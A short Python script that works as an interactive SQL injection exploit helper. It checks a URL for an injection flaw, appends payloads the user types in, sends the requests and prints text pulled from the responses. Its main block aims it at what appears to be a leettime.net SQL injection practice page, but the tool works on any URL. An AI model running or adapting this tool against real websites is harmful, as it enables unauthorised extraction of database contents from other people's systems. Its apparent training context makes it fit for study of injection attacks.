import requests
import validator.valid_checkers as valid
from bs4 import BeautifulSoup
import checker.searcher as checker
import colorama
import re
import urllib.parse

colorama.init(autoreset=True)


def get_content(html, param):
    results = []
    soup = BeautifulSoup(html.text, 'lxml')
    all_data = soup.find_all(param)
    for num, data in enumerate(all_data[0].contents):
        if num % 2 == 1:
            results.append(data)
    return results


def manual_exploit(site):
    is_vuln, msg, pattern = checker.search_vuln(site, is_print=False, is_pattern=True)
    if is_vuln:
        print(msg)
        while True:
            payload = input("\nEnter payload: ")
            if payload == "0":
                exit()
            else:
                result = valid.check_res(site + payload)
                if len(result) == 4:
                    msg = f'{colorama.Fore.RED}{result[2]}'
                elif len(result) == 3:
                    msg = f'{colorama.Fore.RED}{result[-1]} return 404'
                else:
                    result_list = []
                    for elem in get_content(result[0], pattern):
                        result_list.append(elem)
                    msg = colorama.Fore.RED + "\n".join(result_list)
                print(msg)

    else:
        print(msg)


if __name__ == "__main__":
    # manual_exploit('http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1')
    # print(find_pattern("http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1'"))
    #print(get_content("http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1"))
    manual_exploit('http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1')
